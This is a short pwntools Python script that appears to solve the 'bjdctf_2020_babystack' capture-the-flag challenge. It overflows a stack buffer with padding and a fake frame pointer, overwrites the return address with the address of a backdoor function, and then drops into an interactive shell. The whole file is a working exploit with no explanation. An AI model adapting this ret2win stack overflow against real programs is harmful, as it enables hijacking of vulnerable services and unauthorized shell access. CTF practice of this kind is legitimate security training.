# coding=utf-8

from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

p = process('./bjdctf_2020_babystack')
elf = ELF('./bjdctf_2020_babystack')

padding = 'a' * 0x10
fake_ebp = 'k1ose2jo'
ret_backdoor_addr = 0x04006E6

payload = padding + fake_ebp + p64(ret_backdoor_addr)
print(len(payload))
p.sendlineafter('name:\n', '50')
p.sendlineafter('name?\n', payload)
p.interactive()
